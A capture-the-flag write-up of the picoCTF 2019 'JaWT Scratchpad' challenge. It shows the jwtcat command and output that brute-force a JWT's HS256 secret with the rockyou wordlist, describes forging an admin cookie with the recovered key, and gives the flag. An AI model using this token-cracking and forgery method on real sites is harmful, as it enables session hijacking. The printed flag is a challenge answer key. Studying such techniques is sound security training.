# JaWT Scratchpad

## Question
Check the admin scratchpad! https://2019shell1.picoctf.com/problem/49900/ or http://2019shell1.picoctf.com:49900

## Solution
First visit the website and login as a random user. We saw that after logging in, we have a new cookie field "jwt". Referring to [this website](https://auth0.com/blog/brute-forcing-hs256-is-possible-the-importance-of-using-strong-keys-to-sign-jwts/). Go to the website https://jwt.io/, then decode the cookie. We can see the header is 

```
{
  "typ": "JWT",
  "alg": "HS256"
}
```

 and the payload is

 ```
 {
  "user": "adms"
}
```. 

However, we also need to know the secret. We use [this tool](https://github.com/aress31/jwtcat) to brute force the secret. The password is as follow:
```shell
python3 jwtcat.py -t eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiaGpoa2gifQ._IOZV3xyfXsoxhgSiXH76KXDauyVCMILsVTtj-OUPS4 -w ../hashcat-5.0.0/rockyou.txt
[INFO] JWT: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiaGpoa2gifQ._IOZV3xyfXsoxhgSiXH76KXDauyVCMILsVTtj-OUPS4
[INFO] Wordlist: ../hashcat-5.0.0/rockyou.txt
[INFO] Starting brute-force attacks
[WARNING] Pour yourself some coffee, this might take a while...
[INFO] Secret key: ilovepico
[INFO] Secret key saved to location: jwtpot.potfile
[INFO] Finished in 700.0120856761932 sec
``` 

Hence, we can just change the payload and decrypt it again with the secret key. Edit our cookie and then we got the flag.

flag: `picoCTF{jawt_was_just_what_you_thought_1ea6044f378ef6e9d40d57a40f8b70f1}`
